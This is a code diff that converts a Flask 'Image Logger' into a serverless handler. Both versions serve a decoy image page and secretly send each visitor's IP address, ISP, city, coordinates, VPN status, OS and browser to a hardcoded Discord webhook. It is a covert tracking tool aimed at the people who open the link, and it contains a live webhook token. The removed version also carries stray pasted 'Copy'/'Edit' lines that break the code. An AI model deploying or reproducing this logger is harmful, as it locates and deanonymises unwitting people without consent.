@@ -1,80 +1,59 @@
-from flask import Flask, request, make_response
+from httpagentparser import simple_detect
 import requests
-import base64
-import httpagentparser
 
-app = Flask(__name__)
+def handler(request):
+    ip = request.headers.get("x-forwarded-for", "unknown")
+    ua = request.headers.get("user-agent", "unknown")
 
-WEBHOOK = "https://discord.com/api/webhooks/1392237664173821992/eALBCASflu7ORW3tTSGzsTlYt7eb_TFY-dTZE4ZAz6hohPkdMWNq2GZ4C2BiHUQnD0Bh"
-IMAGE_URL = "https://photospace.life/TUHPWY"
+    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
+    os, browser = simple_detect(ua)
 
-def log(ip, user_agent):
+    webhook_url = "https://discord.com/api/webhooks/1392237664173821992/eALBCASflu7ORW3tTSGzsTlYt7eb_TFY-dTZE4ZAz6hohPkdMWNq2GZ4C2BiHUQnD0Bh"
+    image_url = "https://photospace.life/TUHPWY"
+
+    embed = {
+        "username": "Image Logger",
+        "content": "@everyone",
+        "embeds": [{
+            "title": "Image Logger - IP Logged",
+            "color": 0x00FFFF,
+            "thumbnail": {"url": image_url},
+            "description": f"""**A User Opened the Image!**
+
+**IP:** `{ip}`
+**ISP:** `{info.get('isp', 'Unknown')}`
+**ASN:** `{info.get('as', 'Unknown')}`
+**Country:** `{info.get('country', 'Unknown')}`
+**Region:** `{info.get('regionName', 'Unknown')}`
+**City:** `{info.get('city', 'Unknown')}`
+**Coords:** `{info.get('lat', '?')}, {info.get('lon', '?')}`
+**Timezone:** `{info.get('timezone', 'Unknown')}`
+**Mobile:** `{info.get('mobile', '?')}`
+**VPN:** `{info.get('proxy', '?')}`
+**Bot/Hosting:** `{info.get('hosting', '?')}`
+**OS:** `{os}`
+**Browser:** `{browser}`
+
+**User-Agent:""" 
+        }]
+    }
+
     try:
-        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-        os, browser = httpagentparser.simple_detect(user_agent)
-
-        embed = {
-            "username": "Image Logger",
-            "content": "@everyone",
-            "embeds": [{
-                "title": "Image Logger - IP Logged",
-                "color": 0x00FFFF,
-                "description": f"""**A User Opened the Image!**
-
-**IP Info:**
-> **IP:** `{ip}`
-> **Provider:** `{info.get('isp', 'Unknown')}`
-> **ASN:** `{info.get('as', 'Unknown')}`
-> **Country:** `{info.get('country', 'Unknown')}`
-> **Region:** `{info.get('regionName', 'Unknown')}`
-> **City:** `{info.get('city', 'Unknown')}`
-> **Coords:** `{info.get('lat')}, {info.get('lon')}`
-> **Timezone:** `{info.get('timezone', 'Unknown')}`
-> **Mobile:** `{info.get('mobile')}`
-> **VPN:** `{info.get('proxy')}`
-> **Bot:** `{info.get('hosting', False)}`
-
-**PC Info:**
-> **OS:** `{os}`
-> **Browser:** `{browser}`
-
-**User Agent:**
-{user_agent}
-
-""",
-Copy
-Edit
-                "thumbnail": {"url": IMAGE_URL}
-            }]
-        }
-
-        requests.post(WEBHOOK, json=embed)
-    except Exception as e:
-        requests.post(WEBHOOK, json={
-            "username": "Image Logger",
-            "content": "@everyone",
-            "embeds": [{
-                "title": "Image Logger - Error",
-                "color": 0x00FFFF,
-                "description": f"Error while logging IP:\n```\n{str(e)}\n```"
-            }]
-        })
-
-@app.route("/")
-def main():
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    ua = request.headers.get('User-Agent')
-    log(ip, ua)
+        requests.post(webhook_url, json=embed)
+    except:
+        pass
 
     html = f"""
     <html>
     <head><meta charset="utf-8"><title>Loading...</title></head>
     <body style="margin:0;padding:0;background:#000;">
-        <img src="{IMAGE_URL}" style="width:100vw;height:100vh;object-fit:contain;" />
+        <img src="{image_url}" style="width:100vw;height:100vh;object-fit:contain;" />
     </body>
     </html>
     """
-    return make_response(html, 200)
 
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=8080)
+    return {
+        "statusCode": 200,
+        "headers": {"Content-Type": "text/html"},
+        "body": html
+    }
